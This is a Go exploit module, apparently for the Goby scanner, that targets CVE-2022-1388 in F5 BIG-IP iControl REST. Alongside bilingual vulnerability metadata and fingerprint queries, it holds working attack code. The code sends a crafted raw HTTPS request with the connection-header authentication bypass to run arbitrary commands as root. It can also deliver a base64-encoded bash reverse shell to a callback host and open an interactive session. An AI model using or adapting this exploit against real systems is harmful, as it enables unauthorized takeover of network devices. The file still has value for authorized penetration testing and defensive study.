package exploits

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "BIG-IP iControl REST vulnerability (CVE-2022-1388)",
    "Description": "<p>BIG-IP is an application delivery service of F5 company, which is oriented to the world's advanced technology with application as the center. With the help of BIG-IP application delivery controller, keep the application running normally. BIG-IP local traffic manager (LTM) and BIG-IP DNS can handle application traffic and protect infrastructure.This vulnerability may allow an unauthenticated attacker with network access to the BIG-IP system through the management port and/or self IP addresses to execute arbitrary system commands, create or delete files, or disable services. There is no data plane exposure; this is a control plane issue only.</p>",
    "Impact": "BIG-IP iControl REST vulnerability (CVE-2022-1388)",
    "Recommendation": "<p>Referring to the impact scope of the vulnerability, the F5 official has given a solution, which can be upgraded to an unaffected version or repaired by referring to the official website https://support.f5.com/csp/article/K23605346.</p>",
    "Product": "f5-BIGIP",
    "VulType": [
        "Permission Bypass",
        "Command Execution"
    ],
    "Tags": [
        "Command Execution",
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "F5 BIG-IP iControl REST 身份认证绕过漏洞（CVE-2022-1388）",
            "Description": "<p><span style=\"font-size: medium;\">BIG-IP 是 F5 公司的一款应用交付服务是面向以应用为中心的世界先进技术。借助 BIG-IP 应用程序交付控制器保持应用程序正常运行。BIG-IP 本地流量管理器 (LTM) 和 BIG-IP DNS 能够处理应用程序流量并保护基础设施。未经身份验证的攻击者可以通过管理端口或自身 IP 地址对 BIG-IP 系统进行网络访问，执行任意系统命令、创建或删除文件或禁用服务。</span><br></p>",
            "Impact": "<p>未经身份验证的攻击者可以通过管理端口或自身 IP 地址对 BIG-IP 系统进行网络访问，执行任意系统命令、创建或删除文件或禁用服务。<br></p>",
            "Recommendation": "<p><span style=\"font-size: medium;\">参考漏洞影响范围，目前F5官方已给出解决方案，可升级至不受影响版本或参考官网文件进行修复 <a href=\"https://support.f5.com/csp/article/K23605346\">https://support.f5.com/csp/article/K23605346</a>。</span><br></p>",
            "Product": "f5-BIGIP",
            "VulType": [
                "权限绕过",
                "命令执行"
            ],
            "Tags": [
                "权限绕过",
                "命令执行"
            ]
        },
        "EN": {
            "Name": "BIG-IP iControl REST vulnerability (CVE-2022-1388)",
            "Description": "<p><span style=\"font-size: 16px;\"><span style=\"font-size: 16px;\">BIG-IP is an application delivery service of F5 company, which is oriented to the world's advanced technology with application as the center.</span><span style=\"font-size: 16px;\">&nbsp;With the help of BIG-IP application delivery controller, keep the application running normally.</span><span style=\"font-size: 16px;\">&nbsp;BIG-IP local traffic manager (LTM) and BIG-IP DNS can handle application traffic and protect infrastructure.</span>This vulnerability may allow an unauthenticated attacker with network access to the BIG-IP system through the management port and/or self IP addresses to execute arbitrary system commands, create or delete files, or disable services. There is no data plane exposure; this is a control plane issue only.</span><br></p>",
            "Impact": "BIG-IP iControl REST vulnerability (CVE-2022-1388)",
            "Recommendation": "<p><span style=\"font-size: medium;\">Referring to the impact scope of the vulnerability, the F5 official has given a solution, which can be upgraded to an unaffected version or repaired by referring to the official website&nbsp;<a href=\"https://support.f5.com/csp/article/K23605346\">https://support.f5.com/csp/article/K23605346</a>.</span><br></p>",
            "Product": "f5-BIGIP",
            "VulType": [
                "Permission Bypass",
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "((header=\"BIGipServer\" || header=\"X-WA-Info\" || header=\"X-PvInfo\" || header=\"F5_load\" || title=\"BIG-IP&reg;\" || header=\"realm=\\\"BIG-IP\" || header=\"BIGIP\" || header=\"BIG-IP\" || header=\"MRHSession\" || header=\"LastMRH_Session\" || header=\"f5_fullwt=\" || header=\"f5_ht_shrinked=\" || header=\"mrhshint=\" || (body=\"content=\\\"F5 Networks, Inc.\" && title=\"BIG-IP\")) && header!=\"couchdb\" && header!=\"drupal\" && body!=\"Server: couchdb\") || (banner=\"BigIP\" && banner!=\"couchdb\" && banner!=\"drupal\")",
    "GobyQuery": "((header=\"BIGipServer\" || header=\"X-WA-Info\" || header=\"X-PvInfo\" || header=\"F5_load\" || title=\"BIG-IP&reg;\" || header=\"realm=\\\"BIG-IP\" || header=\"BIGIP\" || header=\"BIG-IP\" || header=\"MRHSession\" || header=\"LastMRH_Session\" || header=\"f5_fullwt=\" || header=\"f5_ht_shrinked=\" || header=\"mrhshint=\" || (body=\"content=\\\"F5 Networks, Inc.\" && title=\"BIG-IP\")) && header!=\"couchdb\" && header!=\"drupal\" && body!=\"Server: couchdb\") || (banner=\"BigIP\" && banner!=\"couchdb\" && banner!=\"drupal\")",
    "Author": "su18@javaweb.org",
    "Homepage": "https://www.f5.com/products/big-ip-services",
    "DisclosureDate": "2022-05-05",
    "References": [
        "https://support.f5.com/csp/article/K23605346"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2022-1388"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202205-2141"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/mgmt/shared/authn/login",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "resterrorresponse",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Authorization failed",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "401",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/mgmt/shared/authn/login",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "resterrorresponse",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Authorization failed",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "401",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell_linux,cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "AttackType=cmd"
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10361"
}`

	sendpayloadforF5 := func(host string, payload string) string {
		postData := fmt.Sprintf("{\"command\": \"run\", \"utilCmdArgs\": \"-c %s\"}", payload)
		poc := fmt.Sprintf("POST /mgmt/tm/util/bash HTTP/1.1\r\nHost: 127.0.0.1\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nContent-Type: application/json\r\nX-F5-Auth-Token: a\r\nAuthorization: Basic YWRtaW46\r\nContent-Length: %s\r\nConnection: \r\nConnection: close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host\r\n\r\n%s\r\n", strconv.Itoa(len(postData)), postData)
		conf := &tls.Config{
			InsecureSkipVerify: true,
		}
		conn, err := tls.Dial("tcp", host, conf)
		if err != nil {
			return ""
		}
		defer conn.Close()
		_, err = conn.Write([]byte(poc))
		buf := make([]byte, 4096)
		resp := ""
		for {
			count, err := conn.Read(buf)
			tmpMsg := string(buf[0:count])
			resp += tmpMsg
			if err != nil {
				break
			}
		}
		return resp
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp := sendpayloadforF5(u.HostInfo, "whoami")
			if strings.Contains(resp, "HTTP/1.1 200 OK") && strings.Contains(resp, "tm:util:bash:runstate") && strings.Contains(resp, "\"commandResult\":\"root\\n\"") {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "goby_shell_linux" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					base64cmd := base64.StdEncoding.EncodeToString([]byte(godclient.ReverseTCPByBash(rp)))
					cmd := fmt.Sprintf("{echo,%s}|{base64,-d}|{bash,-i}", base64cmd)
					sendpayloadforF5(expResult.HostInfo.HostInfo, cmd)
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				}
			} else if ss.Params["AttackType"].(string) == "cmd" {
				expResult.Success = true
				result := sendpayloadforF5(expResult.HostInfo.HostInfo, ss.Params["cmd"].(string))
				expResult.Output = regexp.MustCompile(`"commandResult":"(.*?)\\n"}`).FindStringSubmatch(result)[1]
			}
			return expResult
		},
	))
}
